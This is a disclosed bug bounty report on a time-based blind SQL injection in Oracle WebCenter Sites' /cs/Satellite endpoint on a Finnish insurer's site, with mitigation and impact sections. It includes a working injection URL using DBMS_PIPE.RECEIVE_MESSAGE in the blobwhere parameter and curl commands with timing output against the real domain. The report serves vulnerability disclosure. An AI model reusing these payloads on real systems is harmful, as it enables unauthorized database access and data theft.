@@ -1,0 +1,76 @@
+ReportLink:https://hackerone.com/reports/164739
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/g0blin
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:400.0
+Severity:
+State:Closed
+DateOfDisclosure:19.10.2016 6:46:49
+
+Summary:
+##Issue
+
+The reporter found an issue in the Oracle Webcenter Sites using a specific page to trigger an SQLi (time-based blind SQL Injection attack). 
+
+##Fix
+
+The issue was investigated and found to be valid. The fix was to block the flawed functionality.
+
+##Reasoning
+
+The reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. The bounty was based on consequence-risk assessment.
+
+# Summary
+
+There exists an SQL Injection vulnerability on the path `/cs/Satellite`. This path accepts numerous fields, including `blobtable`, `blobcol`, `blobkey` and `blobwhere`. It is possible to sufficiently manipulate the the `blobwhere` field in order to trigger a time-based blind SQL Injection attack.
+
+# Scope
+
+Domain: `www.lahitapiola.fi`
+Path: `/cs/Satellite`
+Parameter: `blobwhere`
+Method: `Time-based Blind`
+
+# Proof of Concept
+
+It is possible to recreate this vulnerability by requesting the following URL. The value `[INT]` will need to be replaced with a numeric value that has not been used in a request before. I can only assume that this is due to caching on the application or database side due to configuration.
+
+    http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata&blobkey=id&blobtable=MungoBlobs&blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5)%20AND%20%27bar%27=%27bar
+
+The following terminal output demonstrates triggering this vulnerability. The first two requests trigger the vulnerability, which we know due to the response time greater than `5s`. The third request is identical to the second, however does not trigger the vulnerability due to the aforementioned assumed caching behaviour.
+
+    15:25 ~: time curl "http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata&blobkey=id&blobtable=MungoBlobs&blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1000,5)%20AND%20%27bar%27=%27bar" -O /dev/null
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100  1019  100  1019    0     0    196      0  0:00:05  0:00:05 --:--:--   256
+    curl: (3) <url> malformed
+
+    real	0m5.186s
+    user	0m0.004s
+    sys	0m0.008s
+    15:25 ~: time curl "http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata&blobkey=id&blobtable=MungoBlobs&blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1001,5)%20AND%20%27bar%27=%27bar" -O /dev/null
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100  1019  100  1019    0     0    195      0  0:00:05  0:00:05 --:--:--   254
+    curl: (3) <url> malformed
+
+    real	0m5.218s
+    user	0m0.005s
+    sys	0m0.006s
+    15:26 ~: time curl "http://www.lahitapiola.fi/cs/Satellite?blobcol=urldata&blobkey=id&blobtable=MungoBlobs&blobwhere=1310812269330%27%20AND%205851=DBMS_PIPE.RECEIVE_MESSAGE(1001,5)%20AND%20%27bar%27=%27bar" -O /dev/null
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100  1019  100  1019    0     0   6195      0 --:--:-- --:--:-- --:--:--  6213
+    curl: (3) <url> malformed
+
+    real	0m0.172s
+    user	0m0.004s
+    sys	0m0.004s
+
+# Mitigation
+
+All user input accepted in to the application should be correctly sanitised prior to being used within queries. The field used in this attack is `blobwhere`.
+
+# Dangers
+
+As an attacker is able to insert arbitrary SQL in to the query behind this request, they would be able to extract information behind the backing database. Depending upon configuration of the database, this could subsequently lead to disclosure of information, or execution of commands on the remote system.
